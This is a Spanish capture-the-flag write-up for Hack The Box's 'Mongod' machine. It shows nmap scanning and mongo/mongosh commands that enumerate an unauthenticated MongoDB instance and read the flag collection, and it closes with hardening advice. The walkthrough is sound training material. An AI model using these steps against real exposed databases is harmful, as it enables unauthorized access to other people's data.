# Hack The Box — Starting Point 7: Mongod

Notas sobre **MongoDB** (base de datos **NoSQL** orientada a documentos), puerto **27017/tcp**, acceso **sin autenticación** con el cliente **`mongo`** / **`mongosh`** y enumeración de colecciones para extraer la flag.

---

## Contexto

**Mongod** introduce **MongoDB**, una base **NoSQL documental** que guarda datos en **BSON** (JSON binario). Por defecto, en versiones antiguas mal configuradas, escucha en **0.0.0.0:27017** **sin autenticación**: cualquiera con red puede listar bases de datos, colecciones y documentos.

El reto: escanear, conectarse con `mongo`/`mongosh`, listar bases (`show dbs`), elegir la correcta y consultar la colección con la flag.

---

## Conceptos del módulo (respuestas a las tareas)

### Tarea 1 — ¿Qué tipo de base de datos es MongoDB? Dos palabras.

**Document database** (*base de datos documental*). Variante NoSQL: cada registro es un “documento” BSON con estructura flexible (sin esquema fijo como SQL).

### Tarea 2 — ¿En qué año fue lanzada MongoDB?

**2009**. Desarrollada por *10gen* (hoy MongoDB Inc.).

### Tarea 3 — ¿Qué comando se usa para escanear puertos abiertos en un sistema concreto?

**`nmap`**.

### Tarea 4 — ¿Cuál es el puerto por defecto de MongoDB?

**27017/tcp**. Otros puertos relacionados: 27018 (shard), 27019 (config server), 28017 (HTTP admin interface, deprecado).

### Tarea 5 — ¿Qué flag de Nmap se utiliza para realizar un escaneo con scripts NSE?

**`-sC`** ejecuta los scripts marcados como `default`. Para uno concreto: **`--script <nombre>`**.

```bash
nmap -p 27017 --script mongodb-info TARGET_IP
```

- `mongodb-info`: revela versión, módulos, build, sistema, bind interfaces, etc.
- `mongodb-databases`: si no exige auth, lista las bases de datos.

### Tarea 6 — ¿Qué herramienta de línea de comandos podemos usar para interactuar con la base de datos MongoDB?

**`mongo`** (cliente legacy, MongoDB ≤4.x) o **`mongosh`** (Mongo Shell moderno, ≥5.x). En Kali más reciente puede que solo tengas `mongosh`.

Instalación rápida en Debian/Kali:

```bash
sudo apt install mongodb-clients   # antiguo
# o
sudo apt install mongodb-mongosh   # moderno
```

### Tarea 7 — ¿Qué comando se utiliza para listar todas las bases de datos en una instancia de MongoDB?

**`show dbs`** (también: `show databases`).

### Tarea 8 — ¿Qué comando se utiliza para listar todas las colecciones de una base de datos?

**`show collections`**.

### Tarea 9 — ¿Qué comando se usa para mostrar todos los documentos de una colección?

**`db.<coleccion>.find()`**. Variantes útiles:

- `db.coleccion.find().pretty()` — formatea el JSON.
- `db.coleccion.find({campo:"valor"})` — filtra.
- `db.coleccion.findOne()` — solo el primero.

## Metodología

### 1. Conectividad

```bash
ping -c 2 TARGET_IP
```

### 2. Nmap dirigido a MongoDB

**Descubrimiento general:**

```bash
nmap -sV -p- --min-rate=1000 TARGET_IP
```

Esperado: `27017/tcp open mongodb MongoDB <version>`.

**Solo el puerto + scripts útiles:**

```bash
nmap -p 27017 -sV --script mongodb-info,mongodb-databases TARGET_IP
```

- `mongodb-info`: versión y configuración expuesta.
- `mongodb-databases`: si no hay auth, ya lista las bases sin abrir cliente.

## Herramienta principal: cliente MongoDB

### Conectar (sintaxis clásica `mongo`)

```bash
mongo --host TARGET_IP
```

o con URI:

```bash
mongo "mongodb://TARGET_IP:27017"
```

### Conectar con `mongosh` (moderno)

```bash
mongosh "mongodb://TARGET_IP:27017"
```

- Si el servidor requiere autenticación: `--username user --password pass --authenticationDatabase admin`.

### Comandos esenciales dentro de la shell de Mongo

| Comando | Función |
|---------|---------|
| `show dbs` | Lista bases de datos visibles |
| `use <db>` | Selecciona una base como activa |
| `db` | Muestra la base activa |
| `show collections` | Lista colecciones de la base activa |
| `db.<col>.find()` | Documentos de una colección |
| `db.<col>.find().pretty()` | JSON formateado |
| `db.<col>.findOne()` | Primer documento |
| `db.<col>.count()` | Cuántos documentos hay |
| `db.<col>.distinct("campo")` | Valores únicos de un campo |
| `db.adminCommand({ listDatabases: 1 })` | Equivalente programático de `show dbs` |
| `exit` / `quit()` | Salir |

### Flujo típico en Mongod

```text
> show dbs
admin       0.000GB
config      0.000GB
local       0.000GB
sensitive_information   0.000GB

> use sensitive_information
switched to db sensitive_information

> show collections
flag

> db.flag.find().pretty()
{ "_id" : ObjectId("..."), "flag" : "HTB{...}" }
```

### Variantes en una sola línea

Sin entrar al shell interactivo:

```bash
mongo --host TARGET_IP --quiet --eval 'db.getMongo().getDBNames()'
mongo --host TARGET_IP/sensitive_information --quiet --eval 'db.flag.find().toArray()'
```

- `--eval`: ejecuta una expresión JavaScript.
- `--quiet`: sin banner.

Con `mongosh`:

```bash
mongosh "mongodb://TARGET_IP/sensitive_information" --quiet --eval 'db.flag.find().toArray()'
```

## Por qué MongoDB queda expuesto

- En **versiones <3.0** escuchaba en `0.0.0.0` por defecto, sin auth.
- En clusters cloud mal montados se omite `security.authorization: enabled`.
- Combinado con cero firewall, basta un `nmap` de Internet para encontrar miles de instancias abiertas (campañas como **Meow attack** llevan años aprovechándolo).

### Defensa rápida

- `bindIp: 127.0.0.1` o IP interna en `/etc/mongod.conf`.
- `security: authorization: enabled` y usuarios con roles mínimos (`readWrite`, `read`).
- Firewall/Security Group restringiendo el puerto 27017.
- TLS (`net.tls.mode: requireTLS`) si el cliente lo permite.
